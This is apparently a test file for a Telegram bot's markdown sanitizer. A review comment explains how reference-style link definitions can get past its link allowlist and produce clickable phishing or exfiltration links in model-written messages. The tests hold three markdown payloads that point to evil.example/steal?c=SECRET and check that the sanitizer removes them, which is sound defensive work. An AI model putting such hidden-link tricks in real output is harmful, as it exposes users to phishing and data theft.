// REVIEW (telegram) — §11.4 step 4 link allowlist bypass through reference-style links. removeReferenceDefinitions() only
// drops lines matching /^ {0,3}\[label\]:\s*\S/, i.e. a definition whose destination is on the SAME line at the top level.
// CommonMark/GFM also accept (a) the destination on the next line, (b) definitions inside a blockquote, (c) inside a list
// item. The shortcut reference "[here]" itself is left verbatim by rewriteLinksAndImages(). Result: a clickable link with
// model-chosen text to any host (phishing / exfiltration by URL), in every final message.
import { fromMarkdown } from 'mdast-util-from-markdown';
import { gfmFromMarkdown } from 'mdast-util-gfm';
import { gfm } from 'micromark-extension-gfm';
import { describe, expect, it } from 'vitest';
import { sanitizeMarkdown } from '../../../src/telegram/render/sanitize.ts';

const ctx = { allowedLinkHosts: new Set<string>(), allowedEmails: new Set<string>() };
const now = Date.UTC(2026, 8, 28);

/** Links as a CommonMark renderer resolves them: inline links plus reference links that have a definition. */
function resolvedLinks(md: string): string[] {
  const tree: any = fromMarkdown(md, { extensions: [gfm()], mdastExtensions: [gfmFromMarkdown()] });
  const defs = new Map<string, string>();
  const refs: string[] = [];
  const out: string[] = [];
  const walk = (n: any) => {
    if (n.type === 'definition') defs.set(n.identifier, n.url);
    if (n.type === 'linkReference') refs.push(n.identifier);
    if (n.type === 'link') out.push(n.url);
    for (const c of n.children ?? []) walk(c);
  };
  walk(tree);
  for (const r of refs) if (defs.has(r)) out.push(defs.get(r)!);
  return out;
}

describe('sanitizer: reference definitions', () => {
  for (const [name, md] of [
    ['destination on the next line', 'Log in [here] to fix it.\n\n[here]:\n  https://evil.example/steal?c=SECRET'],
    ['definition inside a blockquote', 'Log in [here] to fix it.\n\n> [here]: https://evil.example/steal?c=SECRET'],
    ['definition inside a list item', 'Log in [here] to fix it.\n\n- [here]: https://evil.example/steal?c=SECRET'],
  ] as const) {
    it(`no link to a non-allowed host survives (${name})`, () => {
      expect(resolvedLinks(sanitizeMarkdown(md, ctx, now))).not.toContain('https://evil.example/steal?c=SECRET');
    });
  }
});
